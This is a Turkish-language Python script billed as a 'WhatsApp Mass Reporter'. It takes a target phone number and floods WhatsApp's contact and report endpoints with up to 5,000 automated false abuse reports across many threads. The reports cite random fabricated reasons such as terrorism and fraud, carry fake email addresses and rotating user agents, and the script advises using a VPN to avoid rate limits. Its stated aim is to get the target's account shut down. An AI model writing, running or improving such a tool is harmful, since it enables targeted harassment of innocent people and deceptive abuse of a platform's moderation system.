#!/usr/bin/env python3
import requests, threading, random, time, sys, os, json
from fake_useragent import UserAgent
from colorama import init, Fore, Style
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

SIFRE = "admiral71100daphne"

def giris():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + Style.BRIGHT + """
    ╔══════════════════════════════════════╗
    ║        🔐 KSIB GİRİŞ               ║
    ╚══════════════════════════════════════╝
    """ + Style.RESET_ALL)
    
    for i in range(3):
        s = input(Fore.YELLOW + "\n🔑 Şifre: ")
        if s == SIFRE:
            print(Fore.GREEN + "\n✅ Giriş başarılı!\n")
            time.sleep(1)
            return True
        print(Fore.RED + f"❌ Hatalı! ({2-i} hakkın)")
    
    print(Fore.RED + "\n🚫 Program kapatılıyor...")
    time.sleep(2)
    sys.exit(0)

KITALAR = {
    "1": {"isim": "🌍 AFRİKA", "ulkeler": {"20":"Mısır","212":"Fas","213":"Cezayir","216":"Tunus","218":"Libya","220":"Gambiya","221":"Senegal","223":"Mali","224":"Gine","225":"Fildişi","226":"Burkina Faso","227":"Nijer","228":"Togo","229":"Benin","230":"Mauritius","231":"Liberya","232":"Sierra Leone","233":"Gana","234":"Nijerya","235":"Çad","237":"Kamerun","241":"Gabon","242":"Kongo","243":"Dem. Kongo","244":"Angola","249":"Sudan","250":"Ruanda","251":"Etiyopya","252":"Somali","253":"Cibuti","254":"Kenya","255":"Tanzanya","256":"Uganda","257":"Burundi","258":"Mozambik","260":"Zambiya","261":"Madagaskar","263":"Zimbabve","264":"Namibya","265":"Malavi","27":"Güney Afrika","291":"Eritre"}},
    "2": {"isim": "🌍 AVRUPA", "ulkeler": {"30":"Yunanistan","31":"Hollanda","32":"Belçika","33":"Fransa","34":"İspanya","351":"Portekiz","352":"Lüksemburg","353":"İrlanda","354":"İzlanda","355":"Arnavutluk","356":"Malta","357":"Kıbrıs","358":"Finlandiya","359":"Bulgaristan","36":"Macaristan","370":"Litvanya","371":"Letonya","372":"Estonya","373":"Moldova","375":"Belarus","380":"Ukrayna","381":"Sırbistan","382":"Karadağ","385":"Hırvatistan","386":"Slovenya","387":"Bosna","39":"İtalya","40":"Romanya","41":"İsviçre","420":"Çekya","421":"Slovakya","43":"Avusturya","44":"İngiltere","45":"Danimarka","46":"İsveç","47":"Norveç","48":"Polonya","49":"Almanya"}},
    "3": {"isim": "🌏 ASYA", "ulkeler": {"81":"Japonya","82":"Güney Kore","84":"Vietnam","852":"Hong Kong","86":"Çin","880":"Bangladeş","886":"Tayvan","90":"Türkiye","91":"Hindistan","92":"Pakistan","93":"Afganistan","94":"Sri Lanka","95":"Myanmar","961":"Lübnan","962":"Ürdün","963":"Suriye","964":"Irak","965":"Kuveyt","966":"Suudi Arabistan","967":"Yemen","968":"Umman","971":"BAE","972":"İsrail","973":"Bahreyn","974":"Katar","976":"Moğolistan","977":"Nepal","98":"İran","994":"Azerbaycan","995":"Gürcistan","996":"Kırgızistan","998":"Özbekistan"}},
    "4": {"isim": "🌎 AMERİKA", "ulkeler": {"1":"ABD/Kanada","52":"Meksika","53":"Küba","54":"Arjantin","55":"Brezilya","56":"Şili","57":"Kolombiya","58":"Venezuela","501":"Belize","502":"Guatemala","503":"El Salvador","504":"Honduras","505":"Nikaragua","506":"Kosta Rika","507":"Panama","509":"Haiti","51":"Peru","591":"Bolivya","592":"Guyana","593":"Ekvador","595":"Paraguay","597":"Surinam","598":"Uruguay"}},
    "5": {"isim": "🌏 OKYANUSYA", "ulkeler": {"61":"Avustralya","64":"Yeni Zelanda","673":"Brunei","675":"Papua Yeni Gine","676":"Tonga","677":"Solomon Adaları","678":"Vanuatu","679":"Fiji","680":"Palau","685":"Samoa","686":"Kiribati","691":"Mikronezya","692":"Marshall Adaları"}}
}

def ulke_sec():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + "\n🌍 KITA SEÇİMİ\n")
    for k, v in KITALAR.items(): print(Fore.YELLOW + f"[{k}] {v['isim']} ({len(v['ulkeler'])} ülke)")
    print(Fore.CYAN + "\n[0] Direkt kod gir")
    s = input(Fore.GREEN + "\n🌍 Seç: ")
    if s == "0": return input(Fore.GREEN + "Kod: ")
    if s not in KITALAR: return ulke_sec()
    os.system('cls' if os.name == 'nt' else 'clear')
    u = list(KITALAR[s]['ulkeler'].items())
    print(Fore.CYAN + f"\n{KITALAR[s]['isim']}\n")
    for i, (k, v) in enumerate(u, 1): print(f"[{i:3d}] {v} (+{k})")
    try:
        n = int(input(Fore.GREEN + f"\nSeç (1-{len(u)}): "))
        if 1 <= n <= len(u):
            kod, isim = u[n-1]
            print(Fore.GREEN + f"\n✅ {isim} (+{kod})")
            time.sleep(0.5)
            return kod
    except: pass
    return ulke_sec()

class WA:
    def __init__(self):
        self.ua = UserAgent()
        self.b = 0
        self.f = 0
        self.k = threading.Lock()
        self.st = None
        self.mx = 0
        self.s = 0
        self.ulke = "TR"
        self.r = ["spam", "harassment", "inappropriate", "fake_account", 
                  "scam", "fraud", "violence", "terrorism", "drugs", "other"]
        
        # YENİ ÇALIŞAN ENDPOINT'LER
        self.endpoints = [
            {
                "url": "https://www.whatsapp.com/contact/nocontact",
                "method": "post",
                "type": "form"
            },
            {
                "url": "https://www.whatsapp.com/contact/violation",
                "method": "post", 
                "type": "json"
            },
            {
                "url": "https://www.whatsapp.com/contact/report",
                "method": "post",
                "type": "form"
            }
        ]
    
    def bnr(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Fore.GREEN + Style.BRIGHT + """
        ╔══════════════════════════════════════╗
        ║  WHATSAPP MASS REPORTER v6.0       ║
        ║  💬 Güncel Endpoint'ler            ║
        ╚══════════════════════════════════════╝
        """ + Style.RESET_ALL)
    
    def oturum(self):
        s = requests.Session()
        s.headers.update({
            "User-Agent": self.ua.random,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
        })
        return s
    
    def rr(self):
        return random.choice(self.r)
    
    def raporla(self, telefon, sebep, session):
        """Çoklu endpoint ile raporlama"""
        basarili = False
        
        # Her endpoint'i dene
        for endpoint in self.endpoints:
            try:
                url = endpoint["url"]
                
                headers = {
                    "User-Agent": self.ua.random,
                    "Referer": "https://www.whatsapp.com/contact/",
                    "Origin": "https://www.whatsapp.com",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                }
                
                if endpoint["type"] == "json":
                    headers["Content-Type"] = "application/json"
                    data = json.dumps({
                        "report_type": "user",
                        "reported_number": telefon,
                        "violation_type": sebep,
                        "description": f"Report for {sebep}",
                        "email": f"report{random.randint(10000,99999)}@gmail.com",
                        "language": "en",
                        "country": self.ulke,
                        "platform": "web",
                        "app_version": "2.3000.0"
                    })
                    resp = session.post(url, data=data, headers=headers, timeout=10)
                else:
                    headers["Content-Type"] = "application/x-www-form-urlencoded"
                    data = {
                        "phone_number": telefon,
                        "violation": sebep,
                        "description": f"Report for {sebep}",
                        "email": f"report{random.randint(10000,99999)}@gmail.com",
                        "language": "en",
                        "country": self.ulke,
                        "submit": "Submit"
                    }
                    resp = session.post(url, data=data, headers=headers, timeout=10)
                
                # 200, 201, 202, 302, 303 hepsi başarılı sayılır
                if resp.status_code in [200, 201, 202, 302, 303, 301]:
                    basarili = True
                    break
                    
            except Exception as e:
                continue
        
        return basarili
    
    def isci(self, t, tp, tid):
        s = self.oturum()
        while self.s < self.mx:
            r = self.rr()
            try:
                # Sadece bireysel raporlama için
                rs = self.raporla(t, r, s)
                
                with self.k:
                    if self.s >= self.mx: break
                    self.s += 1
                    if rs: self.b += 1
                    else: self.f += 1
                    
                    if self.s % 10 == 0 or self.s == self.mx:
                        e = time.time() - self.st
                        rt = self.s / e if e > 0 else 0
                        et = (self.mx - self.s) / rt if rt > 0 else 0
                        print(f"\r[{'✓' if rs else '✗'}] {self.s}/{self.mx} | "
                              f"✅{self.b} ❌{self.f} | ⚡{rt:.1f}/s | ⏳{et:.0f}s", end="")
                
                time.sleep(random.uniform(1, 3))  # Daha yavaş ama güvenli
                
            except Exception as e:
                continue
    
    def baslat(self, t, tp, c=100, th=20):
        self.mx = c
        print(Fore.CYAN + f"\n📱 Hedef: +{t}")
        print(Fore.CYAN + f"🌍 Ülke: {self.ulke}")
        print(Fore.CYAN + f"📊 Rapor: {c} | 🧵 Thread: {th}")
        print(Fore.YELLOW + "💡 WhatsApp raporları yavaş işlenir, sabırlı olun")
        print(Fore.RED + "\n💣 BAŞLATILIYOR...\n")
        
        self.st = time.time()
        tl = []
        for i in range(th):
            tr = threading.Thread(target=self.isci, args=(t, tp, i))
            tr.daemon = True
            tr.start()
            tl.append(tr)
        
        try:
            for tr in tl:
                tr.join(timeout=1)
                if self.s >= self.mx:
                    break
        except KeyboardInterrupt:
            print(Fore.RED + "\n\n[!] Durduruldu!")
        
        self.sonuc()
    
    def sonuc(self):
        e = time.time() - self.st if self.st else 0
        t = self.b + self.f
        rt = t / e if e > 0 else 0
        pm = rt * 60
        
        print("\n\n" + "="*50)
        print(Fore.GREEN + Style.BRIGHT + "📊 RAPOR SONUCU")
        print("="*50)
        print(f"⏱️  Süre: {e:.1f}s ({e/60:.1f}dk)")
        print(f"📨 Toplam İstek: {t}")
        print(f"✅ Başarılı: {self.b}")
        print(f"❌ Başarısız: {self.f}")
        if t > 0:
            print(f"📈 Başarı Oranı: %{self.b/t*100:.1f}")
        print(f"⚡ Hız: {rt:.1f} istek/s")
        print(f"⏱️  Dakikalık: {pm:.0f} istek/dk")
        print("="*50)
        print(Fore.YELLOW + "\n💡 Not: WhatsApp raporları toplu işlenir.")
        print(Fore.YELLOW + "💡 Hesabın kapanması 24-72 saat sürebilir.")
        print(Fore.YELLOW + "💡 Ne kadar çok rapor, o kadar etkili!")
        print("="*50 + "\n")

def ana():
    giris()
    w = WA()
    w.bnr()
    
    print(Fore.YELLOW + "Rapor Modu:")
    print("1. 👤 WhatsApp Hesabı")
    print("2. 🏢 WhatsApp Business")
    tp = input(Fore.GREEN + "\nSeçim (1-2): ")
    
    w.ulke = ulke_sec()
    
    print(Fore.YELLOW + f"\n📱 Telefon numarası (+{w.ulke} için):")
    print(Fore.CYAN + "Sadece numarayı yaz, ülke kodu otomatik eklenir")
    print(Fore.CYAN + "Örnek: 5XXXXXXXXX veya 81234567890")
    numara = input(Fore.GREEN + "> ")
    
    numara = ''.join(filter(str.isdigit, numara))
    if numara.startswith('0'):
        numara = numara[1:]
    t = w.ulke + numara
    
    print(Fore.YELLOW + "\n📊 Rapor Sayısı:")
    print("1. 100 (Test) | 2. 500 | 3. 1000 | 4. 3000 | 5. 5000")
    c = input(Fore.GREEN + "Seçim: ")
    ct = {"1": 100, "2": 500, "3": 1000, "4": 3000, "5": 5000}.get(c, 100)
    
    print(Fore.YELLOW + "\n🧵 Thread (10-30 önerilir):")
    th = int(input(Fore.GREEN + "Thread (20): ") or "20")
    
    print(Fore.CYAN + "\n📝 ÖNEMLİ BİLGİLER:")
    print("• WhatsApp raporlama sistemi rate-limit uygular")
    print("• Çok hızlı gönderirseniz IP'niz engellenebilir")
    print("• VPN kullanmanız önerilir")
    print("• Başarı oranı %30-50 arası normaldir")
    
    print(Fore.RED + "\n⚠️  YASAL UYARI!")
    if input(Fore.GREEN + "Devam? (E/H): ").upper() == 'E':
        w.baslat(t, tp, ct, th)
    else:
        print(Fore.YELLOW + "\nİptal edildi.")

if __name__ == "__main__":
    try:
        ana()
    except KeyboardInterrupt:
        print(Fore.RED + "\n\n[!] Program kapatıldı!")
        sys.exit(0)
